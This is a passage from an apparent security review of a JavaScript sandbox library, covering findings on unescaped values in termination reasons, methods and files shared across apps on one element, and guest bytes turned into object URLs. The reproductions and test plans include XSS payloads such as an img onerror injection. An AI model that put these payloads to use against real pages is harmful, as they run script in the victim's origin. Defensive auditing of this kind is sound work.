  - It is an allow-list, not a deny-list of native kinds. A deny-list misses engine-specific kinds (`InternalError`) and errors from another realm.
- **Cost:** an embedder's own `throw new TypeError('expected a string')` loses its text. That is acceptable and must be documented: "to send text, throw `new Error(text)`".
- **Host side:** the engine's message stays visible to the host in one `console.warn` per refusal, with the method name.
- **Tests:**
  - **Unit:** a handler throwing each of `JSON.parse(s)`, `BigInt(s)`, `null[s]`, `new URL(s)`, `new RegExp(s+'(')`, `new TextDecoder(s)`, and returning `{ f() { s } }`, is answered without `s`. A plain `new Error('ok')` still arrives as `ok`.
  - **Source scan:** no `refusalFrame(` call in `createBroker` takes `errorMessage(` outside the one gated HANDLER_ERROR path.
  - **E2E:** the `v5-lim` `errs` rows on three engines.
- **Docs:** fix :1658 and :579-581 to state the rule.

#### BD5:DOC-2: `terminated.reason` is not "the library's own text"

##### 1. Which reasons embed a value, and where the value comes from

Every reason comes from `TERMINATION_REASONS` (`src/lib/reasons.ts:26-55`) through `reasonText()` (`:121-125`, `fill()` at `:135`).
Four rows have a `…` slot. The element can also dispatch a fifth kind of text: the embedder's own argument to `terminate()`.

| Reason id | Slot filled by | Source of the value | Filtered? | Reaches the host as markup? |
| :--- | :--- | :--- | :--- | :--- |
| `entryNotRegistered` (`the guest entry "…" is not a registered JavaScript file`) | `src/host.ts:2009`, `entry.slice(0, 256)` | embedder config (`setConfig({ entry })`). If the embedder copies `entry` from an app bundle's manifest, the app's author chose it | **no**: only cut to 256 characters, no quoting or escaping | **yes** |
| `unknownMode` (`unknown mode …`) | `src/lib/config-schema.ts:186`, `describeMode()` at `:183` (`JSON.stringify(mode.slice(0, 32))`) plus `renamedModeNote()` (library text, for `iframe` only) | embedder config (`mode`), which is bundle data if the app's saved config is loaded as is | JSON quoting only (escapes `"` and `\`, not `<`, `>` or `&`), cut to 32 characters | **yes** |
| `configRefused` (`the configuration could not be used (…)`) | `src/host.ts:960`, `errorName(error) + refusalDetail(error)` | the name of the error that cloning or applying the config threw. A getter in the config can throw an error with any `name` | **yes**: `errorName` (`host.ts:570-580`) keeps only `/^[A-Za-z][A-Za-z0-9]{0,63}$/`, otherwise uses `Error`; `refusalDetail` is a fixed table (`csp/origins.ts:135`) | no |
| `buildFailed` (`the environment could not be built (…)`) | `src/host.ts:513` (`'Error'`), `:2637` (`errorName(error)`) | the name of the build's error | yes, the same filter | no |
| (none) `terminate(reason)` | `src/host.ts:876-879` | the embedder's own text, passed through verbatim | no | only if the embedder's text is markup |

Nothing in a reason comes from the guest's runtime: the guest cannot set `entry` or `mode` and cannot call `terminate()`, and
error names go through the filter. The leak needs embedder config that was copied from data an app supplies.

**Reproduction** (`V-DOC-2`, the same on all three engines):
`{"reasons":["the guest entry \"<img src=x onerror=\"window.__fired++\">AAAA…[len 310]","unknown mode \"<img src=x onerror=__fired++>\"","the configuration could not be used (Error)","the configuration could not be used (Evil1Name)"],"parsed":["IMG","IMG"],"fired":3}`.

- An entry from a manifest, assigned to a host `div` with `innerHTML`, became an `<img>` whose `onerror` ran in the host page's
  origin. (`fired: 3` because `+=` parses the first reason again.)
- A 28-character mode payload passed the 32-character cut.
- A config getter that threw an error named `<img …>` gave `(Error)`, while `Evil1Name` passed: the `errorName` filter holds.
- The reporter's numbers are right: 256 characters for `entry`, 32 for `mode`.

##### 2. Is it a realistic leak? Severity: **medium**

- **Precondition:** the host uses `innerHTML` on `terminated.reason`, and some `entry` or `mode` came from a bundle. An app player
  that reads `entry` from each app's manifest is the natural design for the sealed-app recipe's "saved bundle", and a wrong or
  missing entry is exactly when this reason fires.
- **What makes it medium:** `README.md:247` lifts `terminated.reason` out of the attacker-text rule by name. It is the one
  string the docs tell the embedder needs no care. `docs/API.md:1004-1007` says "only a fixed text and, in parentheses, the
  error's name". Both are false for two of the 22 reasons, and a third case is not mentioned (`terminate(text)` echoes the
  embedder's text).
- **Impact:** script in the host page's origin, which is the worst outcome in this threat model.
- **Why it is not high:** it needs the host to put bundle data into config without validating it and to render with
  `innerHTML`. The same docs tell embedders to avoid `innerHTML` everywhere else.

##### 3. Fix

**Recommended, by construction:** a reason interpolates only values the library chose.

- `entryNotRegistered` drops the slot: `the guest entry is not a registered JavaScript file`. The embedder already knows its
  `entry`, and `listFiles()` shows what is registered.
- `unknownMode` drops the echo: `unknown mode` plus `renamedModeNote()`, which names only keys of the library's own
  `RENAMED_MODES`.
- The value can still be shown where it is safe: keep `describeMode`/the entry in the existing `console.warn` notice
  (`config-schema.ts:421`), which is already written as a fixed-first-argument line.
- **Type-level guard:** change `reasonText(id: Templated, detail)` so `detail` is a branded `LibraryDetail`. Only `errorName()`
  and the `refusalDetail`/`renamedModeNote` tables can produce one. A raw `string` is then a compile error.

**Fallback,** if the owner wants the value kept in the text: the reporter's `safeDetail()` (keep `[A-Za-z0-9._/-]`, replace
anything else with `?`, cut to 64). Accept it only after checking that the path rules for `entry` cannot produce
look-alike collisions that matter. I prefer dropping the value: it is simpler, and the sanitiser becomes a second rule that
has to stay in step with the path validator.

**Structural test** (`test/unit/`):
1. For every `Templated` id, drive each call site with hostile inputs:
   - `entry` = `<img src=x onerror=1>"'&%c\n`
   - `mode` = the same string
   - a config getter that throws an error whose `name` is that string
2. Assert that the reason has no `<`, `>`, `&`, `'` or newline, and does not contain the input.
3. A source scan: every `reasonText(<templated id>, …)` call takes its detail from the allowed producers only.

`test/unit/api-docs.test.ts` already keeps the table equal to the registry. Add a column or flag to `ReasonRow`
(`detail: 'none' | 'errorName' | 'library'`) and assert there is no `'config'`.

**Doc fix:**
- Until the code changes:
  - `README.md:247` and `docs/API.md:1004-1007` say that a reason can quote your `entry` (256 characters) and `mode`
    (32 characters), and the text you passed to `terminate()`.
  - Show it with `textContent`, like every other string.
- After the code changes:
  - Say "a reason is a fixed text of the library's, an error's name (letters and digits) in parentheses, or the text you
    passed to `terminate()`".
  - Recommend `textContent` regardless.

#### BD5:DOC-3: methods and files outlive the app on one element; an async handler finishes after `terminate()`

##### 1. Confirmation

**API at 7f227db:**
- `unexpose` does not exist (`typeof el.unexpose === 'undefined'`; no match in `src/`, `docs/` or the README).
- `expose()` replaces and never removes (`src/host.ts:1253-1266`).
- `unregisterFiles(paths?)` exists and removes everything when called with no argument (`src/host.ts:1027`).
- `reset()`, `load()`, `setConfig()` and `terminate()` keep host-exposed methods and registered files. This is documented:
  - `docs/API.md:583`
  - `README.md:363`, `:486`
  - the table at `docs/API.md:1056-1058` ("Kept across a rebuild: Host-exposed methods, registered files, the configuration")
- The sealed-app recipe (`docs/API.md:1513-1581`) never says this, and never says one element per app.

**Reproduction** (`V-DOC-3a`, the same on all three engines). App A exposed `save` and registered `a-private.json`. App B was
then mounted on the same element with the recipe's calls only:
- `sameElement: {"files":["a-private.json","app.js"],"secret":"{\"token\":\"A-SECRET\"}","save":"saved-for-A"}`
- `storedAfterB: {"A":{"owned":"by B"}}`

B read A's file and wrote A's state through A's `save`.

**The two mitigations, measured:**
- **Same element,** with `unregisterFiles()` and `save` replaced by a stub that throws: `{"files":["app.js"],"secret":"ERR NOT_FOUND","save":"ERR HANDLER_ERROR"}`.
  The data is closed, but B still tells `HANDLER_ERROR` from `UNKNOWN_METHOD`, so it can list the previous app's method names.
- **New element:** `{"files":["app.js"],"secret":"ERR NOT_FOUND","save":"ERR UNKNOWN_METHOD"}`. Clean.

##### 2. Library defect or docs gap? Severity: **medium** (docs gap)

The behaviour is designed and documented: "Methods belong to the element", "Files belong to the element". This is not a defect.
The recipe is the page an embedder copies to build an app, and it takes a `sandbox` from the caller (`mountTodoApp(sandbox, …)`)
without saying the element must not be shared with another app. An app player with one element is the obvious design, and it
gets a cross-app read of files and a cross-app write through host methods. The reporter's medium stands.

The missing removal API is a real, if small, gap: without it, reuse leaks method names even when done carefully.

##### 3. Minimal correct design

1. **Docs, required:**
   - In the recipe, `mountTodoApp` creates its own element and returns `dispose()`, which removes it.
   - Add one sentence: "Methods you `expose()` and files you register belong to the element, not to the app: one element per
     app. To switch apps on one element, call `unregisterFiles()` and replace every exposed method, and even then the new app
     can tell which names exist."
   - Add a test in `test/e2e/sealed-app.spec.ts` that mounts a second, different app after the todo app and asserts
     `UNKNOWN_METHOD`/`NOT_FOUND` for the first app's method and file (that is, the recipe uses a new element).
2. **API, optional, needs owner approval for a new public name:**
   - **Proposed:** `unexpose(names?: string[]): void`. It removes the given names, or all host-exposed names when called with
     no argument, which mirrors `unregisterFiles(paths?)`. Reserved `sandbox:` names are untouched. A removed name answers
     `UNKNOWN_METHOD`.
   - **Alternative 1:** `removeExposed(names?: string[])`.
   - **Alternative 2:** `clearExposed()`, which removes all and takes no argument.
   - A calls/arguments variant, `expose(name, null)`, needs no new name, but it widens a typed signature and reads poorly.
3. **Environment-scoped methods** (an `expose(name, fn, { lifetime: 'environment' })` option, or methods scoped to a
   generation) is the class-L answer. It changes a documented semantic and is more than this finding needs. Keep it as a
   backlog option, not the fix.

##### 4. The async handler after `terminate()`

**The library drops the result by construction.**
- An answer goes back on the port the request arrived on (`src/host.ts:1478`, `:1602`, comment at `:1576-1584`).
- Teardown closes that port, and a post on a closed port is discarded.
- The broker never cancels a started handler (`src/lib/rpc.ts:603-650`; there is no `AbortSignal`).

**Reproduction** (`V-DOC-3b`, all three engines): `{"state":"ready","store":{"todos":"zombie"},"log":["A ready","handler start","reset ready","handler wrote"],"newEnvPeek":"undefined"}`.
- The handler's own write ran after `terminate()`, after the host deleted the data, and after a new environment was ready.
- Its return value reached no environment: the new one held no stale answer, and there was no error.

**The side effect is the embedder's own code.** The library cannot undo a host function's work, and it says that pending
*host* calls are settled with `TERMINATED` (`docs/API.md:1028`). Nothing says the reverse: guest-to-host handlers that already
started keep running to completion.

**What the docs should say** (under `expose()` and in the recipe's stop/delete step):
- "A handler that started keeps running after `terminate()`, `reset()` or `setConfig()`; only its answer is dropped. A handler
  that writes should check a flag or generation you set when you stop the app, and stop before writing. Delete an app's data
  after its handlers have settled, or make the write conditional on the app still being mounted."

**Severity: low** (a docs gap; the embedder's own side effect).
- Optional API idea, owner approval needed: pass an `AbortSignal` as a trailing argument or through `this`. Either changes the
  handler's contract, so it is not proposed as the fix.

2. open it top level, or in an `<iframe>`/`<object>`.

Showing it as an `<img>` alone is inert. Step 2 is often the user's own "open image in new tab" or a "full size" link. Today's
docs at `docs/API.md:1668-1669` ("Treat what the app wrote as the app's data, its path and type as well as its bytes … show it
with `textContent`") and the recipe's security note (`:1646-1658`) cover text sinks only, never URL-making from bytes.

One thing not tested: a host page whose CSP has no `'unsafe-inline'` probably blocks the SVG's inline script, because a `blob:`
document inherits its creator's policy. That is a mitigation for some embedders, not a fix.

**What the library can enforce, and what only the docs can:**
- **The library cannot stop** `new Blob([bytes], { type })` in the host. The embedder holds the bytes and picks the type, and a
  guest can return an `ArrayBuffer` or a string as easily as a `Blob`. Retyping `Blob` results from `call()` to
  `application/octet-stream` would break legitimate typed transfers and is bypassed by any other value shape. Not recommended
  as the fix.
- **The library can make the safe path the easy one** (a new public name, so owner approval is needed):
  - **Proposed:** `guestWriteURL(path)`. It returns an object URL only for a write whose type is in `VIEW_WRITE_TYPES`
    (PNG/JPEG/GIF/WebP/AVIF) **and** whose leading bytes match that type's signature (sniffed, as the view's own minting
    does). Anything else gets `null`, or a URL typed `application/octet-stream` (which downloads, per variants 4/6).
  - **Alternatives:** `imageURL(path)`, or `listGuestWrites({ safeType: true })`, which reports `type` as
    `application/octet-stream` for non-raster writes.
- **Optional by-construction step with no new name:** have `listGuestWrites()` report `type` only from the closed table of
  types the element understands, so a guest-chosen `text/html` on `note.png` is reported as what the path's extension maps to,
  or as `application/octet-stream`. Today it passes through the guest's string. This narrows variant 1 only; variants 0 and 2
  remain.
- **Docs, required.** One rule in Guest writes, in the recipe's "App to host" security note and in `call()`'s remarks:
  - "Bytes the app wrote or returned become a document of **your** origin when you make a URL of them and it is opened. Never
    pass the guest's `type`, or no type, to `new Blob`/`URL.createObjectURL`. Show an image the app made inside the view
    (`render('<img src="path">')`), or, in your page, as a `Blob` you typed yourself as a raster type after checking its
    signature, in an `<img>` only. Offer anything else as a download (`<a download>`, or `application/octet-stream`). Never
    use `target=_blank`, `<iframe>`, `<object>` or `location` on it."
  - Add the safe snippet to "Images the app makes".
  - Add a docs-structure test (`attacker-text-docs.test.ts`) that every public output carrying guest bytes
    (`GuestWrite.content`, `call()`'s result) is listed with this note.
  - If the helper is added, keep `V-CHL-2` as its e2e guard: variants 0, 1, 2 and 8 through the helper must download or
    give `null`, on all three engines.
